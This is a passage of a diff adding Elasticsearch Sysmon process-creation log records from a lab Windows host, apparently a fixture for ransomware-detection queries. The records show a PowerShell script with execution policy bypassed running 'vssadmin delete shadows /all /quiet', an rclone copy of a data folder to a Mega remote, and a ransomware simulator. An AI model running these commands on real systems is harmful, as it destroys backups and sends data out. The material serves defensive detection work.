+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-11-21 11:29:05.349\nProcessGuid: {88E52A21-8081-6B01-7E00-000000002300}\nProcessId: 3788\nImage: C:\\Windows\\System32\\vssadmin.exe\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\nDescription: Command Line Interface for Microsoft\u00ae Volume Shadow Copy Service \nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: VSSADMIN.EXE\nCommandLine: \"C:\\Windows\\system32\\vssadmin.exe\" delete shadows /all /quiet\nCurrentDirectory: C:\\Windows\\system32\\\nUser: C0015\\Administrator\nLogonGuid: {88E52A21-807E-6B01-9B5F-0E0000000000}\nLogonId: 0xe5f9b\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=8C1FABCC2196E4D096B7D155837C5F699AD7F55EDBF84571E4F8E03500B7A8B0,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE\nParentProcessGuid: {88E52A21-807E-6B01-7C00-000000002300}\nParentProcessId: 1796\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1\nParentUser: C0015\\Administrator",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-11-21T11:29:05.349Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "Administrator"
+          ],
+          "hash": [
+            "8c1fabcc2196e4d096b7d155837c5f699ad7f55edbf84571e4f8e03500b7a8b0",
+            "c1edc431cd345f0a0f32019895d13fce"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "FS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "192.168.106.155",
+            "192.168.50.30"
+          ],
+          "name": "fs01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-3B-C6-18",
+            "00-0C-29-3B-C6-22"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-11-21T11:29:07Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-11-21T11:29:06.441Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "C0015",
+          "name": "Administrator"
+        }
+      },
+      "query_index": 1
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaH93u2TxY-KOnAA5eCT",
+      "_source": {
+        "agent": {
+          "name": "FS01",
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "type": "filebeat",
+          "ephemeral_id": "6fab4ab3-07bd-4e05-a902-393ba704c333",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\ProgramData\\ransomware-sim.exe",
+            "-m",
+            "-net",
+            "-size",
+            "10",
+            "-nomutex",
+            "-p",
+            "C:\\C0015\\corpus"
+          ],
+          "parent": {
+            "args": [
+              "powershell",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-File",
+              "C:\\ProgramData\\fs01-task.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 1796,
+            "args_count": 6,
+            "entity_id": "{88E52A21-807E-6B01-7C00-000000002300}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1"
+          },
+          "pe": {
+            "imphash": "9b1c32c8188bab095286168e66414a26"
+          },
+          "name": "ransomware-sim.exe",
+          "pid": 4784,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 8,
+          "entity_id": "{88E52A21-8081-6B01-8100-000000002300}",
+          "hash": {
+            "sha256": "3c44c9b44fe5c6caf63fde9ac13a73f8c471f13f01bbf08eebedb98742e12441"
+          },
+          "executable": "C:\\ProgramData\\ransomware-sim.exe",
+          "command_line": "\"C:\\ProgramData\\ransomware-sim.exe\" -m -net -size 10 -nomutex -p C:\\C0015\\corpus"
+        },
+        "winlog": {
+          "record_id": "883458",
+          "computer_name": "FS01.c0015.lab",
+          "process": {
+            "pid": 2552,
+            "thread": {
+              "id": 3700
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "LogonGuid": "{88E52A21-807E-6B01-9B5F-0E0000000000}",
+            "IntegrityLevel": "High",
+            "TerminalSessionId": "0",
+            "ParentUser": "C0015\\Administrator",
+            "LogonId": "0xe5f9b"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-11-21 11:29:05.443\nProcessGuid: {88E52A21-8081-6B01-8100-000000002300}\nProcessId: 4784\nImage: C:\\ProgramData\\ransomware-sim.exe\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: \"C:\\ProgramData\\ransomware-sim.exe\" -m -net -size 10 -nomutex -p C:\\C0015\\corpus\nCurrentDirectory: C:\\Windows\\system32\\\nUser: C0015\\Administrator\nLogonGuid: {88E52A21-807E-6B01-9B5F-0E0000000000}\nLogonId: 0xe5f9b\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=3C44C9B44FE5C6CAF63FDE9AC13A73F8C471F13F01BBF08EEBEDB98742E12441,IMPHASH=9B1C32C8188BAB095286168E66414A26\nParentProcessGuid: {88E52A21-807E-6B01-7C00-000000002300}\nParentProcessId: 1796\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1\nParentUser: C0015\\Administrator",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-11-21T11:29:05.443Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "Administrator"
+          ],
+          "hash": [
+            "3c44c9b44fe5c6caf63fde9ac13a73f8c471f13f01bbf08eebedb98742e12441",
+            "9b1c32c8188bab095286168e66414a26"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "FS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "192.168.106.155",
+            "192.168.50.30"
+          ],
+          "name": "fs01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-3B-C6-18",
+            "00-0C-29-3B-C6-22"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-11-21T11:29:07Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "created": "2026-11-21T11:29:06.441Z",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "C0015",
+          "name": "Administrator"
+        }
+      },
+      "query_index": 1
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaH93u2TxY-KOnAA5eBp",
+      "_source": {
+        "agent": {
+          "name": "FS01",
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "type": "filebeat",
+          "ephemeral_id": "6fab4ab3-07bd-4e05-a902-393ba704c333",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\ProgramData\\rclone.exe",
+            "--config",
+            "C:\\ProgramData\\rclone.conf",
+            "copy",
+            "C:\\C0015\\corpus",
+            "Mega:DATA",
+            "-q",
+            "--ignore-existing",
+            "--auto-confirm"
+          ],
+          "parent": {
+            "args": [
+              "powershell",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-File",
+              "C:\\ProgramData\\fs01-task.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 1796,
+            "args_count": 6,
+            "entity_id": "{88E52A21-807E-6B01-7C00-000000002300}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1"
+          },
+          "pe": {
+            "file_version": "1.75.1",
+            "product": "Rclone",
+            "imphash": "70df50797f7a85a271c38135c5679c40",
+            "description": "Rclone",
+            "original_file_name": "rclone.exe",
+            "company": "https://rclone.org"
+          },
+          "name": "rclone.exe",
+          "pid": 3956,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 9,
+          "entity_id": "{88E52A21-807F-6B01-7D00-000000002300}",
+          "hash": {
+            "sha256": "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c"
+          },
+          "executable": "C:\\ProgramData\\rclone.exe",
+          "command_line": "\"C:\\ProgramData\\rclone.exe\" --config C:\\ProgramData\\rclone.conf copy C:\\C0015\\corpus Mega:DATA -q --ignore-existing --auto-confirm"
+        },
+        "winlog": {
+          "record_id": "883417",
+          "computer_name": "FS01.c0015.lab",
+          "process": {
+            "pid": 2552,
+            "thread": {
+              "id": 3700
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "https://rclone.org",
+            "LogonGuid": "{88E52A21-807E-6B01-9B5F-0E0000000000}",
+            "Description": "Rclone",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "High",
+            "Product": "Rclone",
+            "ParentUser": "C0015\\Administrator",
+            "FileVersion": "1.75.1",
+            "LogonId": "0xe5f9b"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-11-21 11:29:03.415\nProcessGuid: {88E52A21-807F-6B01-7D00-000000002300}\nProcessId: 3956\nImage: C:\\ProgramData\\rclone.exe\nFileVersion: 1.75.1\nDescription: Rclone\nProduct: Rclone\nCompany: https://rclone.org\nOriginalFileName: rclone.exe\nCommandLine: \"C:\\ProgramData\\rclone.exe\" --config C:\\ProgramData\\rclone.conf copy C:\\C0015\\corpus Mega:DATA -q --ignore-existing --auto-confirm\nCurrentDirectory: C:\\Windows\\system32\\\nUser: C0015\\Administrator\nLogonGuid: {88E52A21-807E-6B01-9B5F-0E0000000000}\nLogonId: 0xe5f9b\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=033EEE51C9AD47C2DE2624B6674D355274BCD6CF0027A5F85DB4437BA24AE81C,IMPHASH=70DF50797F7A85A271C38135C5679C40\nParentProcessGuid: {88E52A21-807E-6B01-7C00-000000002300}\nParentProcessId: 1796\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1\nParentUser: C0015\\Administrator",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-11-21T11:29:03.415Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "Administrator"
+          ],
+          "hash": [
+            "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c",
+            "70df50797f7a85a271c38135c5679c40"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "FS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "192.168.106.155",
+            "192.168.50.30"
+          ],
+          "name": "fs01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-3B-C6-18",
+            "00-0C-29-3B-C6-22"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-11-21T11:29:07Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-11-21T11:29:05.440Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "C0015",
+          "name": "Administrator"
+        }
+      },
+      "query_index": 2
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaH93u2TxY-KOnAA5eB-",
+      "_source": {
+        "agent": {
+          "name": "FS01",
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "ephemeral_id": "6fab4ab3-07bd-4e05-a902-393ba704c333",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\vssadmin.exe",
+            "delete",
+            "shadows",
+            "/all",
+            "/quiet"
+          ],
+          "parent": {
+            "args": [
+              "powershell",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-File",
+              "C:\\ProgramData\\fs01-task.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 1796,
+            "args_count": 6,
+            "entity_id": "{88E52A21-807E-6B01-7C00-000000002300}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.1 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "c1edc431cd345f0a0f32019895d13fce",
+            "description": "Command Line Interface for Microsoft\u00ae Volume Shadow Copy Service ",
+            "original_file_name": "VSSADMIN.EXE",
+            "company": "Microsoft Corporation"
+          },
+          "name": "vssadmin.exe",
+          "pid": 3788,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 5,
+          "entity_id": "{88E52A21-8081-6B01-7E00-000000002300}",
+          "hash": {
+            "sha256": "8c1fabcc2196e4d096b7d155837c5f699ad7f55edbf84571e4f8e03500b7a8b0"
+          },
+          "executable": "C:\\Windows\\System32\\vssadmin.exe",
+          "command_line": "\"C:\\Windows\\system32\\vssadmin.exe\" delete shadows /all /quiet"
+        },
+        "winlog": {
+          "record_id": "883437",
+          "computer_name": "FS01.c0015.lab",
+          "process": {
+            "pid": 2552,
+            "thread": {
+              "id": 3700
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Command Line Interface for Microsoft\u00ae Volume Shadow Copy Service ",
+            "LogonGuid": "{88E52A21-807E-6B01-9B5F-0E0000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "High",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "C0015\\Administrator",
+            "FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+            "LogonId": "0xe5f9b"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-11-21 11:29:05.349\nProcessGuid: {88E52A21-8081-6B01-7E00-000000002300}\nProcessId: 3788\nImage: C:\\Windows\\System32\\vssadmin.exe\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\nDescription: Command Line Interface for Microsoft\u00ae Volume Shadow Copy Service \nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: VSSADMIN.EXE\nCommandLine: \"C:\\Windows\\system32\\vssadmin.exe\" delete shadows /all /quiet\nCurrentDirectory: C:\\Windows\\system32\\\nUser: C0015\\Administrator\nLogonGuid: {88E52A21-807E-6B01-9B5F-0E0000000000}\nLogonId: 0xe5f9b\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=8C1FABCC2196E4D096B7D155837C5F699AD7F55EDBF84571E4F8E03500B7A8B0,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE\nParentProcessGuid: {88E52A21-807E-6B01-7C00-000000002300}\nParentProcessId: 1796\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1\nParentUser: C0015\\Administrator",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-11-21T11:29:05.349Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "Administrator"
+          ],
+          "hash": [
+            "8c1fabcc2196e4d096b7d155837c5f699ad7f55edbf84571e4f8e03500b7a8b0",
+            "c1edc431cd345f0a0f32019895d13fce"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "FS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "192.168.106.155",
+            "192.168.50.30"
+          ],
+          "name": "fs01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-3B-C6-18",
+            "00-0C-29-3B-C6-22"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-11-21T11:29:07Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-11-21T11:29:06.441Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "C0015",
+          "name": "Administrator"
+        }
+      },
+      "query_index": 2
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaH93u2TxY-KOnAA5eCT",
+      "_source": {
+        "agent": {
+          "name": "FS01",
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "type": "filebeat",
+          "ephemeral_id": "6fab4ab3-07bd-4e05-a902-393ba704c333",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\ProgramData\\ransomware-sim.exe",
+            "-m",
+            "-net",
+            "-size",
+            "10",
+            "-nomutex",
+            "-p",
+            "C:\\C0015\\corpus"
+          ],
+          "parent": {
+            "args": [
+              "powershell",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-File",
+              "C:\\ProgramData\\fs01-task.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 1796,
+            "args_count": 6,
+            "entity_id": "{88E52A21-807E-6B01-7C00-000000002300}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1"
+          },
+          "pe": {
+            "imphash": "9b1c32c8188bab095286168e66414a26"
+          },
+          "name": "ransomware-sim.exe",
+          "pid": 4784,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 8,
+          "entity_id": "{88E52A21-8081-6B01-8100-000000002300}",
+          "hash": {
+            "sha256": "3c44c9b44fe5c6caf63fde9ac13a73f8c471f13f01bbf08eebedb98742e12441"
+          },
+          "executable": "C:\\ProgramData\\ransomware-sim.exe",
+          "command_line": "\"C:\\ProgramData\\ransomware-sim.exe\" -m -net -size 10 -nomutex -p C:\\C0015\\corpus"
+        },
+        "winlog": {
+          "record_id": "883458",
+          "computer_name": "FS01.c0015.lab",
+          "process": {
+            "pid": 2552,
+            "thread": {
+              "id": 3700
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "LogonGuid": "{88E52A21-807E-6B01-9B5F-0E0000000000}",
+            "IntegrityLevel": "High",
+            "TerminalSessionId": "0",
+            "ParentUser": "C0015\\Administrator",
+            "LogonId": "0xe5f9b"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-11-21 11:29:05.443\nProcessGuid: {88E52A21-8081-6B01-8100-000000002300}\nProcessId: 4784\nImage: C:\\ProgramData\\ransomware-sim.exe\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: \"C:\\ProgramData\\ransomware-sim.exe\" -m -net -size 10 -nomutex -p C:\\C0015\\corpus\nCurrentDirectory: C:\\Windows\\system32\\\nUser: C0015\\Administrator\nLogonGuid: {88E52A21-807E-6B01-9B5F-0E0000000000}\nLogonId: 0xe5f9b\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=3C44C9B44FE5C6CAF63FDE9AC13A73F8C471F13F01BBF08EEBEDB98742E12441,IMPHASH=9B1C32C8188BAB095286168E66414A26\nParentProcessGuid: {88E52A21-807E-6B01-7C00-000000002300}\nParentProcessId: 1796\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1\nParentUser: C0015\\Administrator",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-11-21T11:29:05.443Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "Administrator"
+          ],
+          "hash": [
+            "3c44c9b44fe5c6caf63fde9ac13a73f8c471f13f01bbf08eebedb98742e12441",
+            "9b1c32c8188bab095286168e66414a26"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "FS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "192.168.106.155",
+            "192.168.50.30"
+          ],
+          "name": "fs01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-3B-C6-18",
+            "00-0C-29-3B-C6-22"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-11-21T11:29:07Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "created": "2026-11-21T11:29:06.441Z",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "C0015",
+          "name": "Administrator"
+        }
+      },
+      "query_index": 2
+    }
+  ]
+}
